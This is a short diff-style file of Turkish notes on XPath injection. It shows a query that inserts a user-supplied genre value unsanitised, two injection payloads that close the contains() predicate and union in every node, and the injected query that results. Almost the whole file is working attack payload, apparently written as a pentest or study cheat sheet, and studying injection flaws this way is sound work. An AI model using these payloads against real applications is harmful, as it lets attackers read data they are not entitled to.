@@ -1,0 +1,17 @@
+SORGU:
+
+xpath("//hero[contains(genre, '$genre')]/movie");
+
+
+
+PAYLOAD'LAR:
+
+')]/child::node() | onemsiz[contains('onemsiz','onemsiz
+ve
+')]/* | /* [contains('onemsiz','onemsiz
+
+
+
+PAYLOAD'LANMIŞ SORGU:
+
+xpath("//hero[contains(genre, '')]/child::node() | onemsiz[contains('onemsiz','onemsiz')]/movie");
